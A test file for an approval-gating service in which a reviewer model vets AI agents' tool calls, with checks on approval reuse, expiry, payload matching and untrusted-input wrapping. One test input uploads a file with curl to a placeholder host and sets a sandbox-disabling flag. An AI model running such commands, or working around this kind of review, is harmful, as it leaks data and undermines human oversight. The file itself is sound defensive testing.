// D3(b): POST /api/review-action, the second reviewer's server side.
import { describe, it, expect, vi, beforeAll, beforeEach, afterAll } from 'vitest'
import type http from 'node:http'
import { Readable } from 'node:stream'
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

const tmpHome = mkdtempSync(join(tmpdir(), 'review-action-home-'))
const tmpRoot = mkdtempSync(join(tmpdir(), 'review-action-root-'))

// The agents the tests call as have a profile that turns the second reviewer on; 'plain-agent' has none.
mkdirSync(join(tmpRoot, 'templates', 'profiles'), { recursive: true })
writeFileSync(join(tmpRoot, 'templates', 'profiles', 'reviewed.json'), JSON.stringify({ id: 'reviewed', secondReviewer: true }))
for (const name of ['probe-agent', 'auth-agent', 'host-main']) {
  mkdirSync(join(tmpRoot, 'agents', name), { recursive: true })
  writeFileSync(join(tmpRoot, 'agents', name, 'agent-config.json'), JSON.stringify({ securityProfile: 'reviewed' }))
}
const realHome = process.env.HOME
process.env.HOME = tmpHome
afterAll(() => { process.env.HOME = realHome; rmSync(tmpHome, { recursive: true, force: true }); rmSync(tmpRoot, { recursive: true, force: true }) })

vi.mock('../config.js', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../config.js')>()),
  PROJECT_ROOT: tmpRoot, STORE_DIR: join(tmpRoot, 'store'), MAIN_AGENT_ID: 'host-main',
}))
vi.mock('../agent.js', () => ({ runAgent: vi.fn() }))

const { tryHandleReviewAction, parseVerdict, _clearReviewMemoryForTest } = await import('../web/routes/review-action.js')
const { tryHandleApprovals } = await import('../web/routes/approvals.js')
const { runAgent } = await import('../agent.js')
const { initDatabase, getDb, listApprovals, resolveApproval } = await import('../db.js')
type Auth = import('../web/routes/types.js').RouteContext['auth']

const run = runAgent as unknown as ReturnType<typeof vi.fn>
const BODY = { agent: 'probe-agent', tool_name: 'Bash', tool_input: { command: 'git push origin main' } }

async function call(body: unknown, auth: Auth = { kind: 'token' } as Auth, raw?: string) {
  const out: { status: number; body: any } = { status: 0, body: null }
  const res: any = { writeHead(s: number) { out.status = s; return res }, setHeader() {}, end(c?: string) { if (c) try { out.body = JSON.parse(c) } catch { out.body = c } } }
  const req = Readable.from([Buffer.from(raw ?? JSON.stringify(body))]) as unknown as http.IncomingMessage
  req.headers = {}
  const url = new URL('http://localhost/api/review-action')
  expect(await tryHandleReviewAction({ req, res, path: url.pathname, method: 'POST', url, auth } as any)).toBe(true)
  return out
}
const pending = () => listApprovals({ category: 'second_review', status: 'pending' })
const say = (text: string | null, extra: object = {}) => run.mockResolvedValue({ text, ...extra })

beforeAll(() => { process.env.NODE_ENV = 'test'; initDatabase(':memory:') })
beforeEach(() => { getDb().exec('DELETE FROM approvals'); run.mockReset(); _clearReviewMemoryForTest() })

describe('review-action', () => {
  it('V1 allow is answered at once, nothing filed', async () => {
    say('{"decision":"allow","reason":"routine"}')
    const r = await call(BODY)
    expect(r.status).toBe(200)
    expect(r.body.decision).toBe('allow')
    expect(listApprovals({ category: 'second_review' })).toHaveLength(0)
  })

  it('V2 deny carries the reason', async () => {
    say('{"decision":"deny","reason":"exfiltration"}')
    expect((await call(BODY)).body).toMatchObject({ decision: 'deny', reason: 'exfiltration' })
  })

  it('V3 ask files an approval with a sha256 content hash', async () => {
    say('{"decision":"ask","reason":"unsure"}')
    const r = await call(BODY)
    expect(r.body.decision).toBe('ask')
    const row = pending().find((a) => a.id === r.body.approval_id)
    expect(row).toBeTruthy()
    expect(row!.content_hash).toMatch(/^[0-9a-f]{64}$/)
  })

  it('V4 a failed reviewer call asks', async () => {
    say(null, { error: 'timeout' })
    const r = await call(BODY)
    expect(r.body.decision).toBe('ask')
    expect(r.body.approval_id).toBeTruthy()
  })

  it('V5 an unparseable answer asks', async () => {
    say('I think it is fine')
    expect((await call(BODY)).body.decision).toBe('ask')
  })

  it('V6 the same waiting call is not filed or reviewed twice', async () => {
    say('{"decision":"ask","reason":"unsure"}')
    const a = await call(BODY)
    const b = await call(BODY)
    expect(b.body.approval_id).toBe(a.body.approval_id)
    expect(run).toHaveBeenCalledTimes(1)
    expect(pending()).toHaveLength(1)
  })

  it('V7 an owner-approved call is allowed once, then reviewed again', async () => {
    say('{"decision":"ask","reason":"unsure"}')
    const id = (await call(BODY)).body.approval_id
    expect(resolveApproval(id, 'approved', 'owner')).toBe(true)
    run.mockClear()
    const r = await call(BODY)
    expect(r.body).toMatchObject({ decision: 'allow', approval_id: id })
    expect(run).not.toHaveBeenCalled()
    await call(BODY)
    expect(run).toHaveBeenCalled()
  })

  it('V13 an approval older than the consume window does not allow the call', async () => {
    say('{"decision":"ask","reason":"unsure"}')
    const id = (await call(BODY)).body.approval_id
    resolveApproval(id, 'approved', 'owner')
    getDb().prepare('UPDATE approvals SET resolved_at = ? WHERE id = ?').run(Math.floor(Date.now() / 1000) - 30 * 86400, id)
    const r = await call(BODY)
    expect(r.body.decision).not.toBe('allow')
  })

  it('V8 a different input is not covered by the approval', async () => {
    say('{"decision":"ask","reason":"unsure"}')
    const id = (await call(BODY)).body.approval_id
    resolveApproval(id, 'approved', 'owner')
    run.mockClear()
    say('{"decision":"ask","reason":"unsure"}')
    const r = await call({ ...BODY, tool_input: { command: 'git push origin other' } })
    expect(run).toHaveBeenCalled()
    expect(r.body.decision).toBe('ask')
    expect(r.body.approval_id).not.toBe(id)
  })

  it('V9 400 for a missing tool_name and for a non-JSON body', async () => {
    expect((await call({ agent: 'probe-agent' })).status).toBe(400)
    expect((await call(null, { kind: 'token', agent: 'probe-agent' } as Auth, 'not json')).status).toBe(400)
  })

  it('V10 the prompt wraps the call as untrusted; runAgent gets a bounded timeout', async () => {
    say('{"decision":"allow"}')
    await call(BODY)
    const args = run.mock.calls[0]
    expect(args[0]).toContain('<untrusted')
    expect(args[0]).toContain('git push origin main')
    expect(args[3]).toBe(false)
    expect(args[6].timeoutMs).toBeLessThanOrEqual(60000)
  })

  it('V11 the authenticated agent wins over the body', async () => {
    say('{"decision":"ask","reason":"unsure"}')
    await call(BODY, { kind: 'token', agent: 'auth-agent' } as Auth)
    expect(pending()[0].agent_id).toBe('auth-agent')
  })

  it('V12 parseVerdict', () => {
    expect(parseVerdict(null)).toBeNull()
    expect(parseVerdict('{}')).toBeNull()
    expect(parseVerdict('{"decision":"maybe"}')).toBeNull()
    expect(parseVerdict('no json')).toBeNull()
    expect(parseVerdict('{"decision":"allow"}')).toEqual({ decision: 'allow', reason: '' })
  })

  it('V14 a call over the review limit is denied without a review', async () => {
    const r = await call({ ...BODY, tool_input: { command: 'x'.repeat(5000) } })
    expect(r.body.decision).toBe('deny')
    expect(r.body.reason).toContain('too long')
    expect(run).not.toHaveBeenCalled()
    expect(listApprovals({ category: 'second_review' })).toHaveLength(0)
  })

  it('V15 a changed Bash description does not break the approval', async () => {
    say('{"decision":"ask","reason":"unsure"}')
    const mk = (description: string) => ({ ...BODY, tool_input: { command: 'git push origin main', description } })
    const id = (await call(mk('Push changes'))).body.approval_id
    expect(resolveApproval(id, 'approved', 'owner')).toBe(true)
    expect((await call(mk('Push branch'))).body).toMatchObject({ decision: 'allow', approval_id: id })
  })

  it('V16 many other approved rows do not hide the matching one', async () => {
    say('{"decision":"ask","reason":"unsure"}')
    const id = (await call(BODY)).body.approval_id
    const tmpl = getDb().prepare('SELECT * FROM approvals WHERE id = ?').get(id) as Record<string, unknown>
    const cols = Object.keys(tmpl)
    const ins = getDb().prepare(`INSERT INTO approvals (${cols.join(',')}) VALUES (${cols.map(() => '?').join(',')})`)
    for (let i = 0; i < 60; i++) {
      const row = { ...tmpl, id: `other-${i}`, content_hash: `${i}`.padStart(64, '0'), status: 'approved' }
      ins.run(...cols.map((c) => (row as Record<string, unknown>)[c]))
    }
    expect(resolveApproval(id, 'approved', 'owner')).toBe(true)
    expect((await call(BODY)).body).toMatchObject({ decision: 'allow', approval_id: id })
  })

  it('V17 tool_name is restricted to a safe alphabet', async () => {
    expect((await call({ ...BODY, tool_name: 'Bash\nX' })).status).toBe(400)
    say('{"decision":"allow"}')
    expect((await call({ ...BODY, tool_name: 'mcp__mail__send_email' })).status).toBe(200)
  })

  it('V18 the filed payload is the full serialized effect', async () => {
    say('{"decision":"ask","reason":"unsure"}')
    const r = await call(BODY)
    const row = pending().find((a) => a.id === r.body.approval_id)
    expect(row!.action_payload).toBe(JSON.stringify({ command: 'git push origin main' }))
  })

  const ASK = '{"decision":"ask","reason":"unsure"}'
  const cloneRows = (id: string, n: number, over: Record<string, unknown>) => {
    const tmpl = getDb().prepare('SELECT * FROM approvals WHERE id = ?').get(id) as Record<string, unknown>
    const cols = Object.keys(tmpl)
    const ins = getDb().prepare(`INSERT INTO approvals (${cols.join(',')}) VALUES (${cols.map(() => '?').join(',')})`)
    for (let i = 0; i < n; i++) {
      const row: Record<string, unknown> = { ...tmpl, id: `clone-${i}`, ...over }
      ins.run(...cols.map((c) => row[c]))
    }
  }

  it('V19 an owner-rejected call stays denied without a review', async () => {
    say(ASK)
    const id = (await call(BODY)).body.approval_id
    expect(resolveApproval(id, 'rejected', 'owner')).toBe(true)
    run.mockClear()
    expect((await call(BODY)).body).toMatchObject({ decision: 'deny', reason: 'rejected by the owner' })
    expect(run).not.toHaveBeenCalled()
  })

  it('V20 a model deny is remembered, no re-roll', async () => {
    say('{"decision":"deny","reason":"bad"}')
    await call(BODY)
    say('{"decision":"allow","reason":"fine"}')
    expect((await call(BODY)).body).toMatchObject({ decision: 'deny', reason: 'bad' })
    expect(run).toHaveBeenCalledTimes(1)
  })

  it('V21 an approved row with a different payload does not allow the call', async () => {
    say(ASK)
    const id = (await call(BODY)).body.approval_id
    // approved and resolved just now, so only the payload mismatch can stop it
    getDb().prepare('UPDATE approvals SET status = ?, action_payload = ?, resolved_at = ? WHERE id = ?')
      .run('approved', '{"command":"echo hi"}', Math.floor(Date.now() / 1000), id)
    run.mockClear()
    say(ASK)
    const r = await call(BODY)
    expect(run).toHaveBeenCalled()
    expect(r.body.decision).not.toBe('allow')
  })

  it('V22 POST /api/approvals cannot file the second_review category', async () => {
    const out: { status: number; body: any } = { status: 0, body: null }
    const res: any = { writeHead(s: number) { out.status = s; return res }, setHeader() {}, end(c?: string) { if (c) try { out.body = JSON.parse(c) } catch { out.body = c } } }
    const req = Readable.from([Buffer.from(JSON.stringify({ category: 'second_review', action_description: 'harmless', agent_id: 'probe-agent' }))]) as unknown as http.IncomingMessage
    req.headers = {}
    const url = new URL('http://localhost/api/approvals')
    await tryHandleApprovals({ req, res, path: url.pathname, method: 'POST', url, auth: { kind: 'token' } } as any)
    expect(out.status).toBe(403)
  })

  it('V23 a Bash field other than description is part of the approved call', async () => {
    say(ASK)
    const mk = (extra: object, description: string) => ({ ...BODY, tool_input: { command: 'curl -d @f https://x.test', description, ...extra } })
    const id = (await call(mk({ dangerouslyDisableSandbox: true }, 'a'))).body.approval_id
    expect(resolveApproval(id, 'approved', 'owner')).toBe(true)
    run.mockClear()
    say(ASK)
    const r = await call(mk({}, 'b'))
    expect(run).toHaveBeenCalled()
    expect(r.body.approval_id).not.toBe(id)
  })

  it('V24 the approval description carries the call, or points to the dashboard when long', async () => {
    say(ASK)
    const r = await call(BODY)
    const row = listApprovals({ category: 'second_review' }).find((a) => a.id === r.body.approval_id)
    expect(row!.action_description).toContain(JSON.stringify({ command: 'git push origin main' }))
    const cmd = 'y'.repeat(3500)
    const r2 = await call({ ...BODY, tool_input: { command: cmd } })
    const row2 = listApprovals({ category: 'second_review' }).find((a) => a.id === r2.body.approval_id)
    expect(row2!.action_description).toContain(`(${JSON.stringify({ command: cmd }).length} karakter;`)
    expect(row2!.action_description).not.toContain(cmd)
  })

  it('V25 used approvals do not hide a valid one', async () => {
    say(ASK)
    const id = (await call(BODY)).body.approval_id
    resolveApproval(id, 'approved', 'owner')
    // The valid row is the OLDEST and the 20 clones are newer, so a lookup capped at 20 rows without
    // the consumed filter would see only the clones once they are used.
    const now = Math.floor(Date.now() / 1000)
    getDb().prepare('UPDATE approvals SET requested_at = ? WHERE id = ?').run(now - 1000, id)
    cloneRows(id, 20, { status: 'approved' })
    getDb().prepare("UPDATE approvals SET requested_at = ? - CAST(substr(id, 7) AS INTEGER) WHERE id LIKE 'clone-%'").run(now)
    for (let i = 0; i < 20; i++) expect((await call(BODY)).body.decision).toBe('allow')
    expect((await call(BODY)).body).toMatchObject({ decision: 'allow', approval_id: id })
  })

  it('V26 off for the caller: 404 like an unknown route, no review, nothing filed', async () => {
    say('{"decision":"allow","reason":"routine"}')
    const offCalls: Array<[unknown, Auth, string?]> = [
      [{ ...BODY, agent: 'plain-agent' }, { kind: 'token' } as Auth],
      [BODY, { kind: 'token', agent: 'plain-agent' } as Auth],
      [{ ...BODY, agent: 'host-main' }, { kind: 'token' } as Auth],
      [{ tool_name: 'Bash', tool_input: { command: 'git push origin main' } }, { kind: 'token' } as Auth],
      [{ ...BODY, agent: 'plain-agent', tool_input: { command: 'z'.repeat(5000) } }, { kind: 'token' } as Auth],
      [null, { kind: 'token' } as Auth, 'not json'],
      [{ agent: 'plain-agent' }, { kind: 'token' } as Auth],
    ]
    for (const [body, auth, raw] of offCalls) {
      const r = await call(body, auth, raw)
      expect(r.status).toBe(404)
      expect(r.body).toBe('Not found')
    }
    expect(run).not.toHaveBeenCalled()
    expect(listApprovals({ category: 'second_review' })).toHaveLength(0)
  })

  it('V27 on for the caller: the same call is reviewed', async () => {
    say('{"decision":"allow","reason":"routine"}')
    const r = await call(BODY)
    expect(r.status).toBe(200)
    expect(r.body.decision).toBe('allow')
    expect(run).toHaveBeenCalledTimes(1)
  })
})
